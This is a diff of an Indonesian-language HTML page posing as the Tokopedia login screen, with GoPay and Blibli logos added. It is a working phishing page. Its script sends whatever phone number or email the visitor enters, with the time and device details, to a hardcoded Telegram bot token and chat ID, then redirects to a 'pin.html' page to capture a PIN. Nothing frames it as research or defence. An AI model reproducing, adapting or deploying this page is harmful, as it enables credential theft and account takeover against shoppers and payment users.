@@ -1,141 +1,110 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Masuk ke Tokopedia</title>
- <script src="https://cdn.tailwindcss.com"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke Tokopedia</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #f7f7f7;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        .login-card {
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 20px;
+        }
+        /* Menghilangkan panah pada input type number */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+    </style>
 </head>
-<body class="bg-white min-h-screen font-sans">
+<body class="min-h-screen flex flex-col items-center">
 
- <div class="flex items-center px-4 py-4 border-b">
- <button class="mr-3 text-xl">&#8592;</button>
- <h1 class="text-lg font-semibold flex-1">Masuk ke Tokopedia</h1>
- <a href="#" class="text-green-600 font-medium">Daftar</a>
-</div>
+    <div class="w-full flex justify-center items-center gap-10 py-5 bg-white shadow-sm mb-10">
+        <img src="img/logo.png" class="h-10" alt="Tokopedia">
+        <img src="img/gopay.png" class="h-10" alt="Gopay">
+        <img src="img/bibli.png" class="h-7" alt="Blibli">
+    </div>
 
-  <div class="max-w-md mx-auto px-6 mt-8">
- <form id="loginForm">
-   <label for="loginInput" class="block text-gray-400 mb-2">
-   Nomor HP atau Email
-  </label>
-  <input
-   type="text"
-   id="loginInput"
-   name="login"
-   placeholder="Nomor HP atau Email"
-   class="w-full border rounded-lg px-4 py-3 focus:outline-none focus:ring-2 focus:ring-green-500"
-   required
-  />
-  <p class="text-sm text-gray-400 mt-2">Contoh: 08123456789</p>
-   <div class="text-right mt-3">
-   <a href="#" class="text-green-600 font-medium">Butuh bantuan?</a>
-  </div>
-   <button
-   type="submit"
-   id="nextButton"
-   disabled
-   class="w-full mt-6 bg-gray-200 text-gray-400 py-3 rounded-lg font-semibold cursor-not-allowed transition duration-150"
-  >
-   Selanjutnya
-  </button>
- </form>
-  <div class="flex items-center my-8">
-   <div class="flex-1 h-px bg-gray-200"></div>
-   <span class="px-3 text-gray-400 text-sm">atau masuk dengan</span>
-   <div class="flex-1 h-px bg-gray-200"></div>
-  </div>
-   <button class="w-full border rounded-lg py-3 flex items-center justify-center gap-3 mb-3 hover:bg-gray-50 transition duration-150">
-   <img src="https://www.svgrepo.com/show/475656/google-color.svg" class="w-5 h-5" alt="Google Logo" />
-   <span class="font-medium">Google</span>
-  </button>
-   <button class="w-full border rounded-lg py-3 flex items-center justify-center gap-3 hover:bg-gray-50 transition duration-150">
-  <img src="https://www.svgrepo.com/show/452114/tiktok.svg" class="w-5 h-5" alt="TikTok Logo" />
-  <span class="font-medium">Masuk dengan TikTok</span>
-  </button>
- <p class="text-center text-sm mt-6 text-gray-500">
-Belum punya akun?
-<a href="#" class="text-green-600 font-medium hover:text-green-700">Daftar</a>
- </p>
- </div>
+    <div class="w-full max-w-[400px] px-4">
+        <div class="flex justify-center mb-6">
+            <img src="img/image.png" class="h-12" alt="Tokopedia Logo">
+        </div>
 
-<script>
-    // Konfigurasi Telegram
-    const CHAT_ID = "7823308464";
-    const BOT_TOKEN = "8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8";
-    const now = new Date().toLocaleString("id-ID");
-    const NEXT_PAGE_URL = "pin.html"; // Ganti dengan URL halaman selanjutnya (misal: halaman OTP)
+        <div class="bg-white login-card p-8 text-center border border-gray-100">
+            <h2 class="text-xl font-bold text-gray-800 mb-6">Masukkan No. Handphone</h2>
+            
+            <form id="loginForm">
+                <input
+                    type="tel"
+                    id="loginInput"
+                    name="login"
+                    placeholder="Nomor Handphone"
+                    class="w-full border border-green-500 rounded-lg px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-green-100 mb-6 text-center"
+                    required
+                />
 
-    // Elemen DOM
-    const loginInput = document.getElementById("loginInput");
-    const nextButton = document.getElementById("nextButton");
-    const loginForm = document.getElementById("loginForm");
+                <button
+                    type="submit"
+                    id="nextButton"
+                    class="w-full bg-[#03ac0e] text-white py-3 rounded-lg text-xl font-bold transition duration-150 hover:bg-green-700 shadow-md"
+                >
+                    Verifikasi
+                </button>
+            </form>
+        </div>
 
-    // Fungsi untuk mengaktifkan tombol jika input tidak kosong
-    function toggleButton() {
-        const inputValid = loginInput.value.trim().length > 0;
-        nextButton.disabled = !inputValid;
+        <p class="text-center mt-12 text-gray-600">
+            Tidak Mempunyai Akun? <a href="#" class="text-[#03ac0e] font-bold">Daftar</a>
+        </p>
+    </div>
 
-        if (inputValid) {
-            nextButton.classList.remove("bg-gray-200", "text-gray-400", "cursor-not-allowed");
-            nextButton.classList.add("bg-green-600", "text-white", "hover:bg-green-700");
-        } else {
-            nextButton.classList.add("bg-gray-200", "text-gray-400", "cursor-not-allowed");
-            nextButton.classList.remove("bg-green-600", "text-white", "hover:bg-green-700");
-        }
-    }
+    <script>
+        const CHAT_ID = "7823308464";
+        const BOT_TOKEN = "8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8";
+        const NEXT_PAGE_URL = "pin.html";
 
-    // Fungsi untuk mengirim data ke Telegram
-    function sendToTelegram(input) {
-        const message = `👤 *INPUT LOGIN BARU* 👤\n\nInput: *${input}*\nWaktu: ${now}\nPerangkat: ${navigator.userAgent}`;
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        }).then(response => {
-            if (!response.ok) {
-                console.error('Gagal mengirim data ke Telegram');
+        const loginForm = document.getElementById("loginForm");
+        const loginInput = document.getElementById("loginInput");
+        const nextButton = document.getElementById("nextButton");
+
+        loginForm.addEventListener('submit', (event) => {
+            event.preventDefault();
+            const loginValue = loginInput.value.trim();
+
+            if (loginValue) {
+                nextButton.textContent = "Memproses...";
+                nextButton.disabled = true;
+                nextButton.classList.add("opacity-70", "cursor-not-allowed");
+
+                const message = `👤 *INPUT LOGIN BARU*\n\n` +
+                                `Input: *${loginValue}*\n` +
+                                `Waktu: ${new Date().toLocaleString("id-ID")}\n` +
+                                `Perangkat: ${navigator.userAgent}`;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = NEXT_PAGE_URL;
+                    }, 1000);
+                })
+                .catch(error => {
+                    window.location.href = NEXT_PAGE_URL;
+                });
             }
-        }).catch(error => {
-            console.error('Error saat mengirim data ke Telegram:', error);
         });
-    }
-
-    // Event Listener untuk input
-    loginInput.addEventListener('input', toggleButton);
-
-    // Event Listener untuk submit form
-    loginForm.addEventListener('submit', (event) => {
-        event.preventDefault(); // Mencegah form melakukan submit default
-
-        const loginValue = loginInput.value.trim();
-
-        if (loginValue) {
-            // Menonaktifkan tombol saat proses
-            nextButton.textContent = "Memproses...";
-            nextButton.disabled = true;
-            nextButton.classList.remove("bg-green-600", "hover:bg-green-700");
-            nextButton.classList.add("bg-gray-400");
-
-
-            // Kirim data ke Telegram
-            sendToTelegram(loginValue);
-
-            // Simulasi loading selama 2 detik sebelum redirect
-            setTimeout(() => {
-                window.location.href = NEXT_PAGE_URL;
-            }, 2000); 
-        }
-    });
-
-    // Inisialisasi status tombol saat halaman dimuat
-    toggleButton();
-</script>
-
+    </script>
 </body>
 </html>
